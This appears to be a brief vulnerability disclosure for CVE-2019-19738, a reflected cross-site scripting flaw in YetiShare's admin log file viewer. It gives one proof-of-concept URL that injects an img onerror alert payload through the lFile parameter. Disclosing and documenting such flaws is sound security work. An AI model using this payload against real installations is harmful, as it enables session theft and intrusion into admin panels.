# CVE-2019-19738
YetiShare v3.5.2 - v4.5.3 Cross-site scripting in log_file_viewer.php

# Example
```
http://192.168.0.62/admin/log_file_viewer.php?lType=system&lFile=20%3Cimg%20src=x%20onerror=alert(1)%3E191207.txt
```

</br></br>
<kbd>
  <img src="/yetishare-xss1.png?raw=true">
</kbd>
